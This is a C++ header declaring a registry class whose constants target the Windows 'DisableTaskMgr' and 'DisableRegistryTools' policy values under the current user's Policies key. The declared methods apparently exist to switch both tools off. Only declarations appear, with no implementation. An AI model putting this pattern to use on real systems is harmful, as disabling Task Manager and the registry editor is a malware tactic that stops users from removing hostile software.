#pragma once
#include <iostream>
#include <Windows.h>

#define WIN32_LEAN_AND_MEAN
#pragma warning(disable:4129)
typedef long _L32;

namespace SYS
{
	class Registry {
	protected:

		LPCWSTR DisableTaskMgr = L"DisableTaskMgr";
		LPCWSTR DisableReg = L"DisableRegistryTools";
		HKEY hKey = HKEY_CURRENT_USER;
		LPCWSTR TMGR_PATH = (L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\");
		DWORD val_disable = 1;
		DWORD val_enable = 0;

	public:

		void ProcessValue();
		void ModifyRegistry();

	};
}
